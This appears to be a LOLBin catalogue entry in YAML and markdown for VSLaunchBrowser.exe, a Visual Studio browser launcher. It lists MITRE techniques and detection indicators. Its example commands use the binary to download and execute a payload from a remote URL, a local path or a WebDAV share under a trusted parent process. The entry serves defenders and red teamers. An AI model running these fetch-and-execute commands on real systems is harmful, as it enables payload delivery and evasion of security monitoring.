---
id: windows-execution-vslaunchbrowser
namespace: windows:execution:vslaunchbrowser
name: vslaunchbrowser
description: 'Microsoft Visual Studio browser launcher tool for web applications debugging Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe; C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- vslaunchbrowser
parameters: []
features: []
execution:
  template: vslaunchbrowser
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download and execute payload from remote server (It will download a remote file to INetCache and open it using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
  command: VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
- description: Execute payload via VSLaunchBrowser as parent process (It will open a local file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
  command: VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
- description: Execute payload from WebDAV server via VSLaunchBrowser as parent process (It will open a remote file using the default app associated with the supplied file extension with VSLaunchBrowser as parent process.)
  command: VSLaunchBrowser.exe .exe {PATH_SMB}
references: []
techniques:
- exfiltration
- execution
- defense-evasion
mitre_ids:
- T1105
- T1127
detections:
- type: ioc
  description: cmd.exe as sub-process of VSLaunchBrowser
- type: ioc
  description: URL on a VSLaunchBrowser command line
- type: ioc
  description: VSLaunchBrowser making unexpected network connections or DNS requests
install:
- method: choco
  package_name: vslaunchbrowser
  commands:
  - choco install vslaunchbrowser
---


# vslaunchbrowser

vslaunchbrowser is a Windows LOLBin. Microsoft Visual Studio browser launcher tool for web applications debugging Located at: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe; C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\IDE\VSLaunchBrowser.exe.
